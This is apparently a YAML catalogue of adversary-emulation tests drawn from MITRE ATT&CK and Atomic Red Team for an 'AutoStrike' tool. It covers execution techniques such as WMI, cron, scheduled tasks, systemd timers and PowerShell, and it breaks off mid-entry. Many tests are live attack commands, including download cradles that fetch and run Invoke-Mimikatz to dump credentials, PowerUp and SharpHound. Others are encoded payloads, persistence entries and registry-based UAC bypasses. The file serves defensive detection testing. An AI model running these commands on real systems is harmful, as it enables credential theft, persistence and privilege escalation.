# AutoStrike MITRE ATT&CK Techniques - execution
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1047
  name: Windows Management Instrumentation
  description: |-
    Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.

    The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) suc...
  tactic: execution
  platforms:
    - windows
  executors:
    - name: WMI Reconnaissance Users
      type: cmd
      platform: windows
      command: wmic useraccount get /ALL /format:csv
      timeout: 120
    - name: WMI Reconnaissance Processes
      type: cmd
      platform: windows
      command: wmic process get caption,executablepath,commandline /format:csv
      timeout: 120
    - name: WMI Reconnaissance Software
      type: cmd
      platform: windows
      command: wmic qfe get description,installedOn /format:csv
      timeout: 120
    - name: WMI Reconnaissance List Remote Services
      type: cmd
      platform: windows
      command: wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
      timeout: 120
    - name: WMI Execute Local Process
      type: cmd
      platform: windows
      command: wmic process call create notepad.exe
      cleanup: wmic process where name='notepad.exe' delete >nul 2>&1
      timeout: 120
    - name: WMI Execute Remote Process
      type: cmd
      platform: windows
      command: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process call create notepad.exe
      cleanup: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process where name='notepad.exe' delete >nul 2>&1
      timeout: 120
    - name: Create a Process using WMI Query and an Encoded Command
      type: cmd
      platform: windows
      command: powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
      timeout: 120
    - name: Create a Process using obfuscated Win32_Process
      type: powershell
      platform: windows
      command: |-
        $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
        $NewClass = $Class.Derive("Win32_Atomic")
        $NewClass.Put()
        Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe
      cleanup: |-
        $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Atomic"))
        try { $CleanupClass.Delete() } catch {}
      timeout: 120
      elevation_required: true
    - name: WMI Execute rundll32
      type: cmd
      platform: windows
      command: wmic /node:127.0.0.1 process call create "rundll32.exe \"PathToAtomicsFolder\..\ExternalPayloads\calc.dll\" StartW"
      cleanup: taskkill /f /im calculator.exe
      timeout: 120
    - name: Application uninstall using WMIC
      type: cmd
      platform: windows
      command: wmic /node:"127.0.0.1" product where "name like 'Tightvnc%%'" call uninstall
      cleanup: msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1047
  is_safe: false
- id: T1053.002
  name: At
  description: Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments...
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: At.exe Scheduled task
      type: cmd
      platform: windows
      command: at 13:20 /interactive cmd
      timeout: 120
    - name: At - Schedule a job
      type: sh
      platform: linux
      command: echo "echo Hello from Atomic Red Team" | at now + 1 minute
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1053/002
  is_safe: false
- id: T1053.003
  name: Cron
  description: |-
    Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.

    An adversary may use <c...
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - linux
    - macos
  executors:
    - name: Cron - Replace crontab with referenced file
      type: sh
      platform: linux
      command: |-
        crontab -l > /tmp/notevil
        echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
      cleanup: crontab /tmp/notevil
      timeout: 60
    - name: Cron - Replace crontab with referenced file
      type: sh
      platform: macos
      command: |-
        crontab -l > /tmp/notevil
        echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
      cleanup: crontab /tmp/notevil
      timeout: 60
    - name: Cron - Add script to all cron subfolders
      type: bash
      platform: macos
      command: |-
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
      cleanup: |-
        rm /etc/cron.daily/persistevil -f
        rm /etc/cron.hourly/persistevil -f
        rm /etc/cron.monthly/persistevil -f
        rm /etc/cron.weekly/persistevil -f
      timeout: 60
      elevation_required: true
    - name: Cron - Add script to all cron subfolders
      type: bash
      platform: linux
      command: |-
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.hourly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.monthly/persistevil
        echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.weekly/persistevil
      cleanup: |-
        rm /etc/cron.daily/persistevil -f
        rm /etc/cron.hourly/persistevil -f
        rm /etc/cron.monthly/persistevil -f
        rm /etc/cron.weekly/persistevil -f
      timeout: 60
      elevation_required: true
    - name: Cron - Add script to /etc/cron.d folder
      type: sh
      platform: linux
      command: echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
      cleanup: rm /etc/cron.d/persistevil -f
      timeout: 60
      elevation_required: true
    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
      type: bash
      platform: linux
      command: echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
      cleanup: rm /var/spool/cron/crontabs/persistevil -f
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1053/003
  is_safe: false
- id: T1053.005
  name: Scheduled Task
  description: 'Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the W...'
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Scheduled Task Startup Script
      type: cmd
      platform: windows
      command: |-
        schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
        schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
      cleanup: |-
        schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
        schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Scheduled task Local
      type: cmd
      platform: windows
      command: SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
      cleanup: SCHTASKS /Delete /TN spawn /F >nul 2>&1
      timeout: 120
    - name: Scheduled task Remote
      type: cmd
      platform: windows
      command: SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST 20:10
      cleanup: SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN "Atomic task" /F >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Powershell Cmdlet Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $Action = New-ScheduledTaskAction -Execute "calc.exe"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        $Set = New-ScheduledTaskSettingsSet
        $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
        Register-ScheduledTask AtomicTask -InputObject $object
      cleanup: Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
      timeout: 120
    - name: Task Scheduler via VBA
      type: powershell
      platform: windows
      command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
      cleanup: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
      timeout: 120
    - name: WMI Invoke-CimMethod Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
        Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
      cleanup: Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
      timeout: 120
      elevation_required: true
    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
      type: cmd
      platform: windows
      command: |-
        reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
        schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
      cleanup: |-
        schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
        reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
      timeout: 120
    - name: Import XML Schedule Task with Hidden Attribute
      type: powershell
      platform: windows
      command: |-
        $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml")
        Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
      cleanup: Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
      timeout: 120
      elevation_required: true
    - name: PowerShell Modify A Scheduled Task
      type: powershell
      platform: windows
      command: |-
        $Action = New-ScheduledTaskAction -Execute "cmd.exe"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        $Set = New-ScheduledTaskSettingsSet
        $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
        Register-ScheduledTask AtomicTaskModifed -InputObject $object
        $NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
        Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
      cleanup: Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
      timeout: 120
    - name: Scheduled Task ("Ghost Task") via Registry Key Manipulation
      type: cmd
      platform: windows
      command: |-
        "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
        "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost add lilghostie "cmd.exe" "/c notepad.exe" $env:USERDOMAIN + '\' + $env:USERNAME logon
      cleanup: |-
        "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -s "cmd.exe"
        "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost delete lilghostie > nul
      timeout: 120
      elevation_required: true
    - name: Scheduled Task Persistence via CompMgmt.msc
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
        schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
        ECHO Let's open the Computer Management console now...
        compmgmt.msc
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
        schtasks /Delete /TN "CompMgmtBypass" /F
      timeout: 120
      elevation_required: true
    - name: Scheduled Task Persistence via Eventviewer.msc
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
        schtasks /Create /TN "EventViewerBypass" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
        ECHO Let's run the schedule task ...
        schtasks /Run /TN "EventViewerBypass"
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
        schtasks /Delete /TN "EventViewerBypass" /F
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1053/005
  is_safe: false
- id: T1053.006
  name: Systemd Timers
  description: 'Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated r...'
  tactic: execution
  tactics:
    - execution
    - persistence
    - privilege-escalation
  platforms:
    - linux
  executors:
    - name: Create Systemd Service and Timer
      type: bash
      platform: linux
      command: |-
        echo "[Unit]" > /etc/systemd/system/art-timer.service
        echo "Description=Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.service
        echo "[Service]" >> /etc/systemd/system/art-timer.service
        echo "Type=simple" >> /etc/systemd/system/art-timer.service
        echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> /etc/systemd/system/art-timer.service
        echo "[Install]" >> /etc/systemd/system/art-timer.service
        echo "WantedBy=multi-user.target" >> /etc/systemd/system/art-timer.service
        echo "[Unit]" > /etc/systemd/system/art-timer.timer
        echo "Description=Executes Atomic Red Team Systemd Timer Service" >> /etc/systemd/system/art-timer.timer
        echo "Requires=art-timer.service" >> /etc/systemd/system/art-timer.timer
        echo "[Timer]" >> /etc/systemd/system/art-timer.timer
        echo "Unit=art-timer.service" >> /etc/systemd/system/art-timer.timer
        echo "OnCalendar=*-*-* *:*:00" >> /etc/systemd/system/art-timer.timer
        echo "[Install]" >> /etc/systemd/system/art-timer.timer
        echo "WantedBy=timers.target" >> /etc/systemd/system/art-timer.timer
        systemctl start art-timer.timer
        systemctl enable art-timer.timer
        systemctl daemon-reload
      cleanup: |-
        systemctl stop art-timer.timer
        systemctl disable art-timer.timer
        rm /etc/systemd/system/art-timer.service
        rm /etc/systemd/system/art-timer.timer
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
    - name: Create a user level transient systemd service and timer
      type: sh
      platform: linux
      command: systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
      cleanup: |-
        systemctl --user stop Atomic-Red-Team.service
        systemctl --user stop Atomic-Red-Team.timer
        rm /tmp/log
      timeout: 60
    - name: Create a system level transient systemd service and timer
      type: sh
      platform: linux
      command: systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
      cleanup: |-
        systemctl stop Atomic-Red-Team.service
        systemctl stop Atomic-Red-Team.timer
        rm /tmp/log
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1053/006
  is_safe: false
- id: T1059
  name: Command and Scripting Interpreter
  description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows C...
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: AutoIt Script Execution
      type: powershell
      platform: windows
      command: Start-Process -FilePath "C:\Program Files (x86)\AutoIt3\AutoIt3.exe" -ArgumentList "PathToAtomicsFolder\T1059\src\calc.au3"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1059
  is_safe: false
- id: T1059.001
  name: PowerShell
  description: 'Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a co...'
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Mimikatz
      type: cmd
      platform: windows
      command: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
      timeout: 120
      elevation_required: true
    - name: Run BloodHound from local disk
      type: powershell
      platform: windows
      command: |-
        import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
        try { Invoke-BloodHound -OutputDirectory $env:Temp }
        catch { $_; exit $_.Exception.HResult}
        Start-Sleep 5
      cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
      timeout: 120
    - name: Run Bloodhound from Memory using Download Cradle
      type: powershell
      platform: windows
      command: |-
        write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
        IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
        Invoke-BloodHound -OutputDirectory $env:Temp
        Start-Sleep 5
      cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
      timeout: 120
    - name: Mimikatz - Cradlecraft PsSendKeys
      type: powershell
      platform: windows
      command: $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
      timeout: 120
      elevation_required: true
    - name: Invoke-AppPathBypass
      type: cmd
      platform: windows
      command: Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
      timeout: 120
    - name: Powershell MsXml COM object - with prompt
      type: cmd
      platform: windows
      command: powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
      timeout: 120
    - name: Powershell XML requests
      type: cmd
      platform: windows
      command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml'');$Xml.command.a.execute | IEX"'
      timeout: 120
    - name: Powershell invoke mshta.exe download
      type: cmd
      platform: windows
      command: C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
      timeout: 120
    - name: PowerShell Fileless Script Execution
      type: powershell
      platform: windows
      command: |-
        # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
        reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
        iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
      cleanup: |-
        Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
        Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
      timeout: 120
    - name: NTFS Alternate Data Stream Access
      type: powershell
      platform: windows
      command: |-
        Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
        $streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
        Invoke-Expression $streamcommand
      cleanup: Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
      timeout: 120
    - name: PowerShell Session Creation and Use
      type: powershell
      platform: windows
      command: |-
        New-PSSession -ComputerName $env:COMPUTERNAME
        Test-Connection $env:COMPUTERNAME
        Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
        Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
        Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
      timeout: 120
      elevation_required: true
    - name: ATHPowerShellCommandLineParameter -Command parameter variations
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop
      timeout: 120
    - name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop
      timeout: 120
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop
      timeout: 120
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
      type: powershell
      platform: windows
      command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop
      timeout: 120
    - name: PowerShell Command Execution
      type: cmd
      platform: windows
      command: powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
      timeout: 120
    - name: PowerShell Invoke Known Malicious Cmdlets
      type: powershell
      platform: windows
      command: |-
        $malcmdlets = "Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord"

        foreach ($cmdlets in $malcmdlets) {
            "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
        foreach ($cmdlets in $malcmdlets) {
            $cmdlets}
      timeout: 120
      elevation_required: true
    - name: PowerUp Invoke-AllChecks
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
        Invoke-AllChecks
      timeout: 120
    - name: Abuse Nslookup with DNS Records
      type: powershell
      platform: windows
      command: |-
        # creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
        # this would not be part of a real attack but helpful for this simulation
        function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
        powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
      timeout: 120
    - name: SOAPHound - Dump BloodHound Data
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2
      timeout: 120
    - name: SOAPHound - Build Cache
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1059/001
  is_safe: false
- id: T1059.002
  name: AppleScript
  description: |-
    Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

    Scripts can be run from the command-line via <code>osascript /pa...
  tactic: execution
  platforms:
    - macos
  executors:
    - name: AppleScript
      type: sh
      platform: macos
